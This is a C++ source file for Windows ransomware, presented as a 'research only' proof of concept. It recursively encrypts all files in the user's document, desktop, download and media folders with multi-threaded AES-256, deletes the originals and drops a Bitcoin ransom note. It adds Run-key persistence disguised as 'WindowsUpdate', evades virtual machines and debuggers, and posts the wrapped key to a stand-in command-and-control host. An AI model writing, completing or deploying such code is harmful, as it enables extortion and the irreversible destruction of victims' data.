// ransomware.cpp - Enhanced Theoretical Advanced Ransomware PoC (All Files Encryption, Recursive, Multi-Threaded)
// WARNING: FOR RESEARCH ONLY. DO NOT COMPILE OR RUN OUTSIDE ISOLATED VM.

// Define missing CSIDL constants (MinGW/shlobj.h may lack newer ones)
#ifndef CSIDL_DOWNLOADS
#define CSIDL_DOWNLOADS 0x0023  // 23: User's Downloads folder (Vista+)
#endif
#ifndef CSIDL_MYPICTURES
#define CSIDL_MYPICTURES 0x0027  // 39: My Pictures
#endif
#ifndef CSIDL_MYVIDEO
#define CSIDL_MYVIDEO 0x0014    // 20: My Videos (or 0x0028 for personal)
#endif
#ifndef CSIDL_MYMUSIC
#define CSIDL_MYMUSIC 0x000D    // 13: My Music
#endif
// Existing ones (fallback if needed)
#ifndef CSIDL_DESKTOP
#define CSIDL_DESKTOP 0x0000    // 0: Desktop
#endif
#ifndef CSIDL_MYDOCUMENTS
#define CSIDL_MYDOCUMENTS 0x0005  // 5: My Documents
#endif

#include <windows.h>
#include <winreg.h>      // Registry persistence
#include <wincrypt.h>    // Windows Crypto API (AES/RSA)
#include <wininet.h>     // HTTP exfil
#include <shlobj.h>      // Known folders (uses defines above)
#include <intrin.h>      // For __cpuid intrinsic
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include <thread>        // Multi-threading
#include <mutex>         // Thread safety
#include <queue>         // For thread pool
#include <chrono>        // Delays
#include <cctype>        // For tolower

#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:WinMainCRTStartup")  // No console, GUI-less entry

#define AES_BLOCK_SIZE 16
#define CHUNK_SIZE 65536  // 64KB chunks for large files
#define MAX_DEPTH 10      // Prevent stack overflow in recursion
#define NUM_THREADS 4     // Multi-threaded encryption

std::mutex file_mutex;  // Protect file ops

// Obfuscated strings (XOR decrypt)
std::string xor_decrypt(const std::string& input, char key) {
    std::string output = input;
    for (char& c : output) c ^= key;
    return output;
}

// VM/Sandbox Detection (CPUID hypervisor bit)
bool is_vm_or_sandbox() {
    int cpu_info[4];
    __cpuid(cpu_info, 1);
    return (cpu_info[2] & (1 << 31)) != 0;
}

// Kill Switch
bool check_killswitch() {
    return GetFileAttributesA("C:\\killswitch.txt") != INVALID_FILE_ATTRIBUTES;
}

// Anti-Debug
bool is_debugged() {
    return IsDebuggerPresent();
}

// Is Excluded Path? (Stability: Skip system dirs)
bool is_excluded_path(const std::string& fullpath) {
    std::string lower_path = fullpath;
    // Convert to lower for comparison (simple, conceptual)
    for (char& c : lower_path) c = std::tolower(static_cast<unsigned char>(c));
    if (lower_path.find("windows") != std::string::npos ||
        lower_path.find("program files") != std::string::npos ||
        lower_path.find("system volume information") != std::string::npos ||
        lower_path.find("recycle.bin") != std::string::npos) {
        return true;
    }
    return false;
}

// File Size Filter (Skip tiny/large files)
bool is_valid_file_size(const std::string& filepath) {
    WIN32_FILE_ATTRIBUTE_DATA attr;
    if (!GetFileAttributesExA(filepath.c_str(), GetFileExInfoStandard, &attr)) return false;
    ULARGE_INTEGER size;
    size.LowPart = attr.nFileSizeLow;
    size.HighPart = attr.nFileSizeHigh;
    return (size.QuadPart > 1024 && size.QuadPart < (1ULL << 30));  // 1KB to 1GB
}

// Generate AES-256 Key & IV
bool generate_aes_key(HCRYPTPROV* hProv, HCRYPTKEY* hKey, unsigned char* iv) {
    if (!CryptAcquireContext(hProv, NULL, MS_ENHANCED_PROV, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return false;
    if (!CryptGenKey(*hProv, CALG_AES_256, CRYPT_EXPORTABLE, hKey)) return false;
    DWORD iv_size = AES_BLOCK_SIZE;
    if (!CryptGenRandom(*hProv, iv_size, iv)) return false;
    return true;
}

// AES-256-CBC Encrypt File (Chunked for large files)
bool encrypt_file(const std::string& filepath, HCRYPTPROV hProv, HCRYPTKEY hKey, unsigned char* iv) {
    std::lock_guard<std::mutex> lock(file_mutex);  // Thread-safe

    if (is_excluded_path(filepath) || !is_valid_file_size(filepath)) return false;

    std::ifstream infile(filepath, std::ios::binary);
    if (!infile) return false;

    std::string outpath = filepath + ".encrypted";
    std::ofstream outfile(outpath, std::ios::binary);

    // Set IV and CBC mode
    if (!CryptSetKeyParam(hKey, KP_IV, iv, 0)) return false;
    DWORD mode = CRYPT_MODE_CBC;
    if (!CryptSetKeyParam(hKey, KP_MODE, (const BYTE*)&mode, 0)) return false;

    unsigned char chunk[CHUNK_SIZE + AES_BLOCK_SIZE];
    DWORD chunk_len;
    bool final_chunk = false;
    while (infile.read((char*)chunk, CHUNK_SIZE) || infile.gcount() > 0) {
        chunk_len = static_cast<DWORD>(infile.gcount());
        final_chunk = infile.eof();
        DWORD max_len = chunk_len + AES_BLOCK_SIZE;
        if (!CryptEncrypt(hKey, 0, (final_chunk ? TRUE : FALSE), 0, chunk, &chunk_len, max_len)) break;
        outfile.write((char*)chunk, chunk_len);
    }
    infile.close();
    outfile.close();

    DeleteFileA(filepath.c_str());
    return true;
}

// Recursive Directory Traversal & Queue Files for Threads
void traverse_directory(const std::string& dir, int depth, std::queue<std::string>& file_queue) {
    if (depth > MAX_DEPTH || is_excluded_path(dir)) return;

    std::string search_path = dir + "\\*";
    WIN32_FIND_DATAA findFileData;
    HANDLE hFind = FindFirstFileA(search_path.c_str(), &findFileData);

    if (hFind == INVALID_HANDLE_VALUE) return;

    do {
        std::string item = findFileData.cFileName;
        std::string fullpath = dir + "\\" + item;

        if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            if (item != "." && item != "..") {
                traverse_directory(fullpath, depth + 1, file_queue);  // Recurse
            }
        } else {
            file_queue.push(fullpath);  // Queue for threading (all files)
        }
    } while (FindNextFileA(hFind, &findFileData) != 0);

    FindClose(hFind);
}

// Worker Thread for Encryption
void worker_thread(HCRYPTPROV hProv, HCRYPTKEY hKey, unsigned char* iv, std::queue<std::string>& file_queue, bool& done) {
    while (!done && !file_queue.empty()) {
        std::string filepath;
        {
            std::lock_guard<std::mutex> lock(file_mutex);
            if (!file_queue.empty()) {
                filepath = file_queue.front();
                file_queue.pop();
            }
        }
        if (!filepath.empty()) {
            encrypt_file(filepath, hProv, hKey, iv);
        }
    }
}

// Drop Ransom Note (Updated for All Files)
void drop_ransom_note(const std::string& path) {
    std::string note_path = path + "\\RANSOM_NOTE.html";
    std::ofstream note(note_path);
    if (note) {
        note << "<html><body><h1>ALL YOUR FILES ARE ENCRYPTED!</h1><p>Recursive scan complete. Pay 0.5 BTC to 1FakeAddress to decrypt everything. Contact: fake@onionmail.com</p></body></html>";
        note.close();
    }
}

// Get Expanded Target Dirs (Uses defined CSIDL)
std::vector<std::string> get_target_dirs() {
    std::vector<std::string> dirs;
    char path[MAX_PATH];
    int csidl[] = {CSIDL_MYDOCUMENTS, CSIDL_DESKTOP, CSIDL_DOWNLOADS, CSIDL_MYPICTURES, CSIDL_MYVIDEO, CSIDL_MYMUSIC};
    for (int id : csidl) {
        if (SUCCEEDED(SHGetFolderPathA(NULL, id, NULL, 0, path))) {
            dirs.push_back(path);
        }
    }
    return dirs;
}

// HTTP Exfil to C2 (Unchanged)
bool exfil_to_c2(const std::vector<unsigned char>& enc_aes_key) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hConnect = InternetConnectA(hInternet, "mock-c2.example.com", INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
    if (!hConnect) { 
        InternetCloseHandle(hInternet); 
        return false; 
    }

    HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", "/upload", NULL, NULL, NULL, INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_RELOAD, 0);
    if (!hRequest) { 
        InternetCloseHandle(hConnect); 
        InternetCloseHandle(hInternet); 
        return false; 
    }

    std::string post_data = "key=";
    for (auto byte : enc_aes_key) {
        post_data += std::to_string(static_cast<unsigned int>(byte)) + ",";
    }
    if (!post_data.empty()) post_data.pop_back();

    const char* headers = "Content-Type: application/x-www-form-urlencoded\r\n";
    HttpSendRequestA(hRequest, headers, -1, (LPVOID)post_data.c_str(), static_cast<DWORD>(post_data.size()));

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

// Generate RSA & Encrypt AES Key Blob (Unchanged)
bool generate_rsa_and_encrypt(HCRYPTPROV hProv, HCRYPTKEY hAesKey, std::vector<unsigned char>& enc_aes_key) {
    HCRYPTKEY hRsaKey;
    if (!CryptGenKey(hProv, CALG_RSA_KEYX, CRYPT_EXPORTABLE, &hRsaKey)) return false;

    DWORD aes_blob_size = 0;
    if (!CryptExportKey(hAesKey, 0, SIMPLEBLOB, 0, NULL, &aes_blob_size)) {
        CryptDestroyKey(hRsaKey);
        return false;
    }
    std::vector<unsigned char> aes_blob(aes_blob_size);
    if (!CryptExportKey(hAesKey, 0, SIMPLEBLOB, 0, aes_blob.data(), &aes_blob_size)) {
        CryptDestroyKey(hRsaKey);
        return false;
    }

    DWORD enc_size = 0;
    if (!CryptEncrypt(hRsaKey, 0, TRUE, 0, NULL, &enc_size, 0)) {
        CryptDestroyKey(hRsaKey);
        return false;
    }
    enc_aes_key.resize(enc_size);
    if (!CryptEncrypt(hRsaKey, 0, TRUE, 0, enc_aes_key.data(), &enc_size, enc_size)) {
        CryptDestroyKey(hRsaKey);
        return false;
    }
    enc_aes_key.resize(enc_size);
    CryptDestroyKey(hRsaKey);
    return true;
}

// Persistence (Unchanged)
void add_persistence() {
    HKEY hKey;
    LONG result = RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        char exe_path[MAX_PATH];
        GetModuleFileNameA(NULL, exe_path, MAX_PATH);
        RegSetValueExA(hKey, "WindowsUpdate", 0, REG_SZ, (BYTE*)exe_path, static_cast<DWORD>(strlen(exe_path) + 1));
        RegCloseKey(hKey);
    }
}

// Progress Marker (Hidden file for C2 sim)
void create_progress_marker(const std::string& dir) {
    std::string marker = dir + "\\.progress";
    std::ofstream prog(marker);
    prog << "100";  // Simulated complete
    prog.close();
    SetFileAttributesA(marker.c_str(), FILE_ATTRIBUTE_HIDDEN);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Randomized delay (3-10s)
    Sleep(3000 + (rand() % 7000));

    if (is_vm_or_sandbox() || is_debugged() || check_killswitch()) {
        return 0;
    }

    add_persistence();

    HCRYPTPROV hProv = 0;
    HCRYPTKEY hAesKey = 0;
    unsigned char iv[AES_BLOCK_SIZE] = {0};
    if (!generate_aes_key(&hProv, &hAesKey, iv)) return 1;

    std::vector<unsigned char> enc_aes_key;
    if (generate_rsa_and_encrypt(hProv, hAesKey, enc_aes_key)) {
        exfil_to_c2(enc_aes_key);
    }

    auto dirs = get_target_dirs();
    std::queue<std::string> file_queue;
    for (const auto& dir : dirs) {
        traverse_directory(dir, 0, file_queue);  // Recursive queue
    }

    // Multi-threaded encryption
    std::vector<std::thread> threads;
    bool done = false;
    for (int i = 0; i < NUM_THREADS; ++i) {
        threads.emplace_back(worker_thread, hProv, hAesKey, iv, std::ref(file_queue), std::ref(done));
    }

    // Wait for threads
    for (auto& t : threads) {
        if (t.joinable()) t.join();
    }
    done = true;

    if (!dirs.empty()) {
        drop_ransom_note(dirs[0]);
        create_progress_marker(dirs[0]);
    }

    if (hAesKey) CryptDestroyKey(hAesKey);
    if (hProv) CryptReleaseContext(hProv, 0);
    return 0;
}